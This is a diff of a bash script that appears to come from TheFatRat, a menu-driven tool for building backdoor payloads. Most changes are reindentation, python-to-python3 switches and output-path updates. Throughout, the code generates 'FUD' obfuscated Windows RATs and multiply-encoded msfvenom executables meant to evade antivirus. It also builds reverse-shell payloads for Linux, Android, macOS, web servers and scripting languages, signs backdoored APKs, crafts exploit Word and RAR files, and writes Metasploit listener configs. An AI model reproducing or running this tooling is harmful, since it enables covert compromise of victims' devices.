-    #check if ming64 exists and provide 32bit or 64bit option to create rat
-    which x86_64-w64-mingw32-gcc >> $logfud 2>&1
+    
+#check if ming64 exists and provide 32bit or 64bit option to create rat
+which x86_64-w64-mingw32-gcc >> $logfud 2>&1
     if [ "$?" -eq "0" ]; then
-    spinlong
-    echo ""
-    echo -e $yellow "  Select Windows Architeture target"
-    echo ""
-    echo -e $cyan "    1 -$okegreen 32Bit (XP,7,Vista)"
-    echo -e $cyan "    2 -$okegreen 64Bit (XP64,Vista,7,8,10)"
-    echo ""
-    echo -ne $lightgreen "Choose (1,2) : "
-    read choice
-    if [ $choice == "1" ]
-    then
-    spinlong
-    echo ""
-icfold="$path/icons"
-    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
-    if [ $lit != 0 ]
-                  then
-echo -e $orange "  +--------------------+"
-echo -e $orange "  |$okegreen Current icons list$orange |"
-echo -e $orange "  +--------------------+"
-for liste in icons/*.ico; do
-                  echo ${liste##*/}
-    done
-    echo -e $orange "  +---------------------+"
-    echo ""
-    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
-    echo ""
-                  echo -ne "   Filename : ";tput sgr0
-                  read fname
+        spinlong
+	  echo ""
+	  echo -e $yellow "  Select Windows Architeture target"
+	  echo ""
+	  echo -e $cyan "    1 -$okegreen 32Bit (XP,7,Vista)"
+	  echo -e $cyan "    2 -$okegreen 64Bit (XP64,Vista,7,8,10)"
+	  echo ""
+	  echo -ne $lightgreen "Choose (1,2) : "
+    	  read choice
+    		if [ $choice == "1" ]; then
+    			spinlong
+    			echo ""
+			icfold="$path/icons"
+    			lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
+    		if [ $lit != 0 ]; then
+			echo -e $orange "  +--------------------+"
+			echo -e $orange "  |$okegreen Current icons list$orange |"
+			echo -e $orange "  +--------------------+"
+				for liste in icons/*.ico; do
+                  			echo ${liste##*/} | sed 's/^/   /g'
+    				done
+					echo -e $orange "  +---------------------+"
+					echo ""
+					echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
+					echo ""
+            echo -ne "   Filename : ";tput sgr0
+            read fname
 fi
-if [ -z $fname ]
-                  then
+
+if [ -z $fname ]; then
+	echo ""
+	echo -e $red "No file name was written"
+	echo ""
+ 	echo -e $okegreen "Building EXE with default icon"
+	spinlong
+	echo ""
+    	echo -e $red "[*] Builing your powerstage rat for windows with the following values"
+    	echo ""
+    	echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
+    	echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    	echo -e $yellow "  Your Port     :$okegreen $yourport"
+    	echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    	fstager=$path/$fira
+    	echo
+    	echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
+    	sleep 4
+    	python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+   	 #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
+    	met="32"
+    	pstagef
+fi
+
+if [ ! -f $icfold/$fname ]; then
     echo ""
-echo -e $red "No file name was written"
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlong
-echo ""
+    echo -e $red "The Filename you wrote does not exist in icons folder."
+    echo ""
+    echo -e $okegreen "Building EXE with default icon"
+    spinlong
+    echo ""
     echo -e $red "[*] Builing your powerstage rat for windows with the following values"
     echo ""
     echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
@@ -1750,37 +1894,14 @@ echo ""
     echo
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
     sleep 4
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
-    #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
-    met="32"
-    pstagef
-fi
-if [ ! -f $icfold/$fname ]
-then
-echo ""
-echo -e $red "The Filename you wrote does not exist in icons folder."
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlong
-echo ""
-  echo -e $red "[*] Builing your powerstage rat for windows with the following values"
-echo ""
-    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
-    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
-    echo -e $yellow "  Your Port     :$okegreen $yourport"
-    echo -e $yellow "  Rat Filename  :$okegreen $fira"
-    fstager=$path/$fira
-    echo
-    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
-    sleep 4
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
     met="32"
     pstagef
 else
-echo ""
-spinlong
-echo ""
+    echo ""
+    spinlong
+    echo ""
     echo -e $red "[*] Builing your powerstage rat for windows with the following values"
     echo ""
     echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
@@ -1791,75 +1912,73 @@ echo ""
     fstager=$path/$fira
     echo
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
-python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
-met="32"
+	python3 $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+	met="32"
     pstagef
 fi
 
-elif [ $choice == "2" ]
-  then
-echo ""
-spinlong
-echo ""
-icfold="$path/icons"
+elif [ $choice == "2" ]; then
+	echo ""
+	spinlong
+	echo ""
+	icfold="$path/icons"
     lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
-    if [ $lit != 0 ]
-                  then
-echo -e $orange "  +--------------------+"
-echo -e $orange "  |$okegreen Current icons list$orange |"
-echo -e $orange "  +--------------------+"
-for liste in icons/*.ico; do
-                  echo ${liste##*/}
-    done
-    echo -e $orange "  +---------------------+"
-    echo ""
-    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
-    echo ""
-                  echo -ne "   Filename : ";tput sgr0
-                  read fname
+	if [ $lit != 0 ]; then
+		echo -e $orange "  +--------------------+"
+		echo -e $orange "  |$okegreen Current icons list$orange |"
+		echo -e $orange "  +--------------------+"
+	for liste in icons/*.ico; do
+                echo ${liste##*/} | sed 's/^/   /g'
+   	done
+		echo -e $orange "  +---------------------+"
+		echo ""
+		echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE or press [ENTER] key for default icon"
+		echo ""
+                echo -ne "   Filename : ";tput sgr0
+                read fname
 fi
-if [ -z $fname ]
-                  then
-    echo ""
-echo -e $red "No file name was written"
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlong
-echo ""
-    echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
-    echo ""
-    echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
-    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
-    echo -e $yellow "  Your Port     :$okegreen $yourport"
-    echo -e $yellow "  Rat Filename  :$okegreen $fira"
-    fstager=$path/$fira
-    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
-    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
-    met="64"
-    pstagef
+
+if [ -z $fname ]; then
+	echo ""
+	echo -e $red "No file name was written"
+	echo ""
+	echo -e $okegreen "Building EXE with default icon"
+	spinlong
+	echo ""
+   	echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
+    	echo ""
+    	echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
+    	echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    	echo -e $yellow "  Your Port     :$okegreen $yourport"
+    	echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    	fstager=$path/$fira
+    	python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    	#Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
+    	met="64"
+    	pstagef
 fi
-if [ ! -f $icfold/$fname ]
-then
-echo ""
-echo -e $red "The Filename you wrote does not exist in icons folder."
-echo ""
- echo -e $okegreen "Building EXE with default icon"
-spinlong
+
+if [ ! -f $icfold/$fname ]; then
+    echo ""
+    echo -e $red "The Filename you wrote does not exist in icons folder."
+    echo ""
+    echo -e $okegreen "Building EXE with default icon"
+    spinlong
     echo -e $red "[*] Builing your powerstager rat for windows with the following values"
     echo ""
-echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
+    echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
     echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
     echo -e $yellow "  Your Port     :$okegreen $yourport"
     echo -e $yellow "  Rat Filename  :$okegreen $fira"
     fstager=$path/$fira
-    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
 else
-echo ""
-spinlong
-echo ""
+    echo ""
+    spinlong
+    echo ""
     echo -e $red "[*] Builing your powerstage rat for windows with the following values"
     echo ""
     echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
@@ -1869,7 +1988,7 @@ echo ""
     echo -e $yellow "  Icon filename :$okegreen $fname"
     fstager=$path/$fira
     echo ""
-  python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+ 	 python3 $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
     #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
@@ -1961,14 +2080,15 @@ echo ""
 #If lhost & lport values are null then popup user manual input
 
         if [ -z "$yourip" ]; then
-				read -p '   Set LHOST IP: ' yourip
+		read -p '   Set LHOST IP: ' yourip
         fi
-        echo -e $okegreen ""
+        	echo -e $okegreen ""
+		
         if [ -z "$yourport" ]; then
-        read -p '   Set LPORT: ' yourport
+        	read -p '   Set LPORT: ' yourport
         fi
-        echo
-        read -p '   Please enter the base name for output files : ' fira
+		echo
+		read -p '   Please enter the base name for output files : ' fira
 
 # Checking if user filled lhost , lport & filename with any input
 # Case any of these inputs are blank then "invalid" function will popup a message to user
@@ -1977,44 +2097,43 @@ echo ""
         invalid
         if [ $err == "1" ]
         then
-        echo -e $okegreen ""
-        echo -n "Press [ENTER] key to return to menu ."
-        read inp
-        cmsfvenom
+		echo -e $okegreen ""
+		echo -n "Press [ENTER] key to return to menu ."
+		read inp
+		cmsfvenom
         fi
-        pldlnx
-        spinlong
-	echo ""
-	echo ""
-	gboor
-	spinlong
-	echo ""
-	echo ""
-      	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
+		pldlnx
+		spinlong
+		echo ""
+		echo ""
+		gboor
+		spinlong
+		echo ""
+		echo ""
+		$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > $output/$fira.elf
 
 # Checking if file was created
-        fileout="output/$fira.elf"
+        fileout="$output/$fira.elf"
         if [ ! -f "$fileout" ]
         then
-        echo -e $red ""
-        echo "There was an error in the creation of your rat file"
-        echo -e $okegreen ""
-        echo -ne "Press [ENTER] key to return to menu ."
-        read cont
-        cmsfvenom
+		echo -e $red ""
+		echo "There was an error in the creation of your rat file"
+		echo -e $okegreen ""
+		echo -ne "Press [ENTER] key to return to menu ."
+		read cont
+		cmsfvenom
         else
-        echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.elf"
-        echo ""
-        echo -ne "Press [ENTER] key to return to menu ."
-        read cont
-        cmsfvenom
+		echo -e $okegreen ""
+		echo "Your rat file was created and it is stored in : $output/$fira.elf"
+		echo ""
+		echo -ne "Press [ENTER] key to return to menu ."
+		read cont
+		cmsfvenom
         fi
 
 	elif test $fatrat1 == '2'
 	then
 
-
 	echo ""
 	spinlong
 	echo -e $okegreen"\n"
@@ -2022,114 +2141,116 @@ echo ""
         echo -e $yellow "  Your local IPV6 address is : $lanip6"
 	echo -e $yellow "  Your public IP address is : $publicip"
 	echo -e $yellow "  Your Hostname is : $hostn"
+	
         if [ ! -f "$defcon" ]
         then
-        yourip=""
-        yourport=""
+		yourip=""
+		yourport=""
         fi
-	echo -e $okegreen""
+		echo -e $okegreen""
 	if [ -z "$yourip" ]; then
-	read -p '   Set LHOST IP: ' yourip
+		read -p '   Set LHOST IP: ' yourip
         fi
+	
         if [ -z "$yourport" ]; then
-        echo ""
-        read -p '   Set LPORT: ' yourport
+        	echo ""
+        	read -p '   Set LPORT: ' yourport
         fi
-        echo ""
-        read -p '   Please enter the base name for output files : ' fira
-	invalid
+        	echo ""
+        	read -p '   Please enter the base name for output files : ' fira
+		invalid
         if [ $err == "1" ]
         then
-        echo -e $okegreen ""
-        echo -n "Press [ENTER] key to return to menu ."
-        read inp
-        cmsfvenom
+		echo -e $okegreen ""
+		echo -n "Press [ENTER] key to return to menu ."
+		read inp
+		cmsfvenom
         fi
-        pldwin
-        spinlong
-	echo ""
-	echo ""
-	gboor
-	spinlong
-	echo ""
-	echo ""
-	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
+		pldwin
+		spinlong
+		echo ""
+		echo ""
+		gboor
+		spinlong
+		echo ""
+		echo ""
+		$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o $output/$fira.exe
 
 # Checking if file was created
-        fileout="output/$fira.exe"
+        fileout="$output/$fira.exe"
         if [ ! -f "$fileout" ]
         then
-        echo -e $red ""
-        echo "There was an error in the creation of your rat file"
-        echo -e $okegreen ""
-        echo -ne "Press [ENTER] key to return to menu ."
-        read cont
-        cmsfvenom
+		echo -e $red ""
+		echo "There was an error in the creation of your rat file"
+		echo -e $okegreen ""
+		echo -ne "Press [ENTER] key to return to menu ."
+		read cont
+		cmsfvenom
         else
-        echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.exe"
-        echo ""
-        echo -ne "Press [ENTER] key to return to menu ."
-        read cont
-        cmsfvenom
+		echo -e $okegreen ""
+		echo "Your rat file was created and it is stored in : $output/$fira.exe"
+		echo ""
+		echo -ne "Press [ENTER] key to return to menu ."
+		read cont
+		cmsfvenom
         fi
 
 	elif test $fatrat1 == '3'
 	then
-	echo ""
-	spinlong
-	echo -e $okegreen"\n"
-	echo -e $yellow "  Your local IPV4 address is : $lanip"
-        echo -e $yellow "  Your local IPV6 address is : $lanip6"
-	echo -e $yellow "  Your public IP address is : $publicip"
-	echo -e $yellow "  Your Hostname is : $hostn"
+		echo ""
+		spinlong
+		echo -e $okegreen"\n"
+		echo -e $yellow "  Your local IPV4 address is : $lanip"
+		echo -e $yellow "  Your local IPV6 address is : $lanip6"
+		echo -e $yellow "  Your public IP address is : $publicip"
+		echo -e $yellow "  Your Hostname is : $hostn"
         if [ ! -f "$defcon" ]
         then
-        yourip=""
-        yourport=""
+		yourip=""
+		yourport=""
         fi
-	echo -e $okegreen""
+		echo -e $okegreen""
 	if [ -z "$yourip" ]; then
-	read -p '   Set LHOST IP: ' yourip
+		read -p '   Set LHOST IP: ' yourip
         fi
         if [ -z "$yourport" ]; then
-        read -p '   Set LPORT: ' yourport
+        	read -p '   Set LPORT: ' yourport
         fi
-        echo ""
-        read -p '   Please enter the base name for output files : ' fira
-        invalid
+		echo ""
+		read -p '   Please enter the base name for output files : ' fira
+		invalid
         if [ $err == "1" ]
         then
-        echo -e $okegreen ""
-        echo -n "Press [ENTER] key to return to menu ."
-        read inp
-        cmsfvenom
+		echo -e $okegreen ""
+		echo -n "Press [ENTER] key to return to menu ."
+		read inp
+		cmsfvenom
         fi
-        pldand
-        echo ""
-	echo ""
-	gboor
-	spinlong
-	echo ""
-	echo -e $okegreen ""
-        echo "[*] Creating RAT payload with msfvenom"
-        sleep 1
-	$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/backdoored/$fira.apk >>$log /dev/null 2>&1
+		pldand
+		echo ""
+		echo ""
+		gboor
+		spinlong
+		echo ""
+		echo -e $okegreen ""
+		echo "[*] Creating RAT payload with msfvenom"
+		sleep 1
+		$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $output/$fira.apk >>$log /dev/null 2>&1
 #check file
-        outapk=$path/backdoored/$fira.apk
+        outapk=$output/$fira.apk
         if [ ! -f "$outapk" ]
         then
-        echo -e $red ""
-        echo "There was a problem in the creation of your rat apk file , make sure your metasploit is running correctly"
-        echo -e $okegreen ""
-        read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-        clear
-        menu
+		echo -e $red ""
+		echo "There was a problem in the creation of your rat apk file , make sure your metasploit is running correctly"
+		echo -e $okegreen ""
+		read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+		clear
+		menu
         fi
 
-        echo "[✔] Done!"
-        echo "[*] Creating a Valid Certificate"
-        sleep 1
+		echo "[✔] Done!"
+		echo "[*] Creating a Valid Certificate"
+		sleep 1
 
         #Creating certificate and storing info in logfile
 
@@ -2137,19 +2258,19 @@ echo ""
         cerapk=$path/temp/debug.keystore
         if [ ! -f "$cerapk" ]
         then
-        echo -e $red ""
-        echo "There was a problem creating a valid certificate ."
-        echo -e $okegreen ""
-        read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-        clear
-        menu
+		echo -e $red ""
+		echo "There was a problem creating a valid certificate ."
+		echo -e $okegreen ""
+		read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+		clear
+		menu
         fi
 
-        echo "[✔] Done!"
-        echo "[*] Signing your payload APK"
-        sleep 1
-        $sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/backdoored/$fira.apk androiddebugkey >>$log 2>&1
-        echo "[✔] Done!"
+		echo "[✔] Done!"
+		echo "[*] Signing your payload APK"
+		sleep 1
+		$sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $output/$fira.apk androiddebugkey >>$log 2>&1
+		echo "[✔] Done!"
 
         # After signing the apk file , android certificate is not needed anymore
         # deleting certificate
@@ -2163,35 +2284,35 @@ echo ""
         echo -ne "Choose y/n : ";tput sgr0
         read sel
         case $sel in
-        y|Y|yes|Yes|YES)
-        echo ""
-        echo -e $green "Write the name for this config . (ex : payloadapk)"
-        echo -ne "Filename : ";tput sgr0
-        read fname
-        if [ -z $fname ]
-        then
-        svf=$path/config/listeners/payloadapk.rc
-        rm -rf $svf >/dev/null 2>&1
-        echo "use exploit/multi/handler" > $svf
-        echo "set PAYLOAD $payload" >> $svf
-        echo "set LHOST $yourip" >> $svf
-        echo "set LPORT $yourport" >> $svf
-        echo "exploit -j" >> $svf
-        echo -e $okegreen ""
-        echo "Configuration file saved to $list/payloadapk.rc"
-        else
-        svf=$path/config/listeners/$fname.rc
-        rm -rf $svf >/dev/null 2>&1
-        echo "use exploit/multi/handler" > $svf
-        echo "set PAYLOAD $payload" >> $svf
-        echo "set LHOST $yourip" >> $svf
-        echo "set LPORT $yourport" >> $svf
-        echo "exploit -j" >> $svf
-        echo -e $okegreen ""
-        echo "Configuration file saved to $list/$fname.rc"
-        fi
+		y|Y|yes|Yes|YES)
+			echo ""
+			echo -e $green "Write the name for this config . (ex : payloadapk)"
+			echo -ne "Filename : ";tput sgr0
+			read fname
+       			 if [ -z $fname ]
+       				 then
+					svf=$path/config/listeners/payloadapk.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD $payload" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/payloadapk.rc"
+        			else
+					svf=$path/config/listeners/$fname.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD $payload" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/$fname.rc"
+       				 fi
         # Checking if file was created
-        fileout="$path/backdoored/$fira.apk"
+        fileout="$output/$fira.apk"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2211,7 +2332,7 @@ echo ""
         ;;
         n|N|no|No|NO)
         # Checking if file was created
-        fileout="$path/backdoored/$fira.apk"
+        fileout="$output/$fira.apk"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2277,10 +2398,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-      	$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
+      	$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > $output/$fira.macho
 
 # Checking if file was created
-          fileout="$path/output/$fira.macho"
+          fileout="$output/$fira.macho"
           if [ ! -f "$fileout" ]
           then
           echo -e $red ""
@@ -2335,9 +2456,9 @@ echo ""
 	spinlong2
 	echo ""
 	echo ""
-        $msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
+        $msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > $output/$fira.php
 # Checking if file was created
-        fileout="$path/output/$fira.php"
+        fileout="$output/$fira.php"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2395,10 +2516,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-        $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
+        $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > $output/$fira.asp
 
 # Checking if file was created
-        fileout="$path/output/$fira.asp"
+        fileout="$output/$fira.asp"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2456,10 +2577,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-    	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
+    	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.jsp
 
 # Checking if file was created
-        fileout="$path/output/$fira.jsp"
+        fileout="$output/$fira.jsp"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2517,9 +2638,9 @@ echo ""
 	spinlong2
 	echo ""
 	echo ""
-      	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
+      	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > $output/$fira.war
 # Checking if file was created
-        fileout="$path/output/$fira.war"
+        fileout="$output/$fira.war"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2577,9 +2698,9 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-        $msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
+        $msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.py
 # Checking if file was created
-fileout="$path/output/$fira.py"
+fileout="$output/$fira.py"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2636,10 +2757,10 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-      	$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
+      	$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.sh
 
 # Checking if file was created
-        fileout="$path/output/$fira.sh"
+        fileout="$output/$fira.sh"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2696,9 +2817,9 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-    	$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
+    	$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.pl
 # Checking if file was created
-        fileout="$path/output/$fira.pl"
+        fileout="$output/$fira.pl"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2760,10 +2881,10 @@ fileout="$path/output/$fira.py"
             rm -rf ~/.msf4/local/* >/dev/null 2>&1
             xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set PAYLOAD $payload ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
             echo ""
-            mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
+            mv ~/.msf4/local/$fira.doc $output/$fira.doc >/dev/null 2>&1
             echo -e $okegreen""
 # Checking if file was created
-            fileout="$path/output/$fira.doc"
+            fileout="$output/$fira.doc"
             if [ ! -f "$fileout" ]
             then
             echo -e $red ""
@@ -2831,10 +2952,10 @@ fileout="$path/output/$fira.py"
               rm -rf ~/.msf4/local/* >/dev/null 2>&1
               xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payload; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'"
               echo ""
-              mv ~/.msf4/local/$fira $path/output/$fira
+              mv ~/.msf4/local/$fira $output/$fira
 
 # Checking if file was created
-            fileout="$path/output/$fira"
+            fileout="$output/$fira"
             if [ ! -f "$fileout" ]
             then
             echo -e $red ""
@@ -2894,10 +3015,10 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f dll -o output/$fira.dll
+	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f dll -o $output/$fira.dll
 
 # Checking if file was created
-        fileout="output/$fira.dll"
+        fileout="$output/$fira.dll"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2908,7 +3029,7 @@ fileout="$path/output/$fira.py"
         cmsfvenom
         else
         echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.dll"
+        echo "Your rat file was created and it is stored in : $output/$fira.dll"
         echo ""
         echo -ne "Press [ENTER] key to return to menu ."
         read cont
@@ -2949,7 +3070,7 @@ echo -e $okegreen"  ============================================================
  			echo -e "	[2]  Listeners for payload Windows"
 			echo -e "        [3]  Listeners for payload Mac"
  			echo -e "	[4]  Listeners for payload Android"
-      echo -e "	[5]  Load a saved Listener"
+      			echo -e "	[5]  Load a saved Listener"
 			echo -e "        [6]  Back to Menu "
  			echo -e " "
   	 	echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"listener$okegreen]:"
@@ -3526,10 +3647,10 @@ case $choice in
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
       	    	echo -e $okegreen""
-                fidoc=$path/output/$fira.doc
+                fidoc=$output/$fira.doc
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.doc "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3616,13 +3737,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
 
-         	fidoc=$path/output/$fira.docm
+         	fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3666,13 +3787,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
 					echo ""
 
-                fidoc=$path/output/$fira.docm
+                fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
